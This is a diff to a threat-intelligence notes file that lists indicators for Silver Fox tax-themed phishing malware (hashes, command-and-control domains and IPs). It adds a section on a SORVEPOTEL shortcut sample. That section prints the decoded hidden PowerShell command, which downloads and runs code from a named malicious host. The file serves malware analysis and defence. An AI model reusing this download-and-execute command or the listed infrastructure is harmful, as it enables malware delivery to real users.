@@ -65,6 +65,9 @@ Income-tax lure PDF opens `ggwk[.]cc`, which serves `tax affairs.exe` (NSIS inst
 - SHA-256: 77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2 (stage 1), fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19 (stage 2), f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa (stage 3), 068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbced7741245a7ea97c (stage 4)
 - C2: b.yuxuanow.top (103.20.195.147), ggwk.cc (45.207.231.94); related tax-themed domains itdd.club, xzghjec.com, gov-a.work/.fit/.club, gvo-b.club, gov-c.club, govk.club, swjc2025bjkb.cn, 2025swmm.cn
 
+## SORVEPOTEL shortcut sample (VirusTotal, first seen 1 Oct 2025)
+`malware-whatsapp.rar` (SHA-256 5debd60e266037898bd11f94de614b8411ee2c6b4fd1d54ca0c21578a67614ac, 727 bytes, 27/76 engines, Trend Micro name SORVEPOTEL) contains `DOC-50998906_17774E7A.lnk` (SHA-256 af085f3afbe074c0da6a354be3aabc4677ed03bd0627b4447fb68c6e16089943). The shortcut runs an obfuscated `cmd /D/C "for %Y in (nc) do ..."` that builds `powershell -w hid -enc ...`, which decodes to `IEX (New-Object Net.WebClient).DownloadString('https://zapgrande[.]com/api/itbi/PxlJWZbCuamhhCWjurXBv6K0w1vfVGTw')`. C2: zapgrande.com (109.176.30.141:443).
+
 ## References
 
 - CloudSEK, Silver Fox targeting India using tax-themed phishing lures (2025-12-24): https://www.cloudsek.com/blog/silver-fox-targeting-india-using-tax-themed-phishing-lures
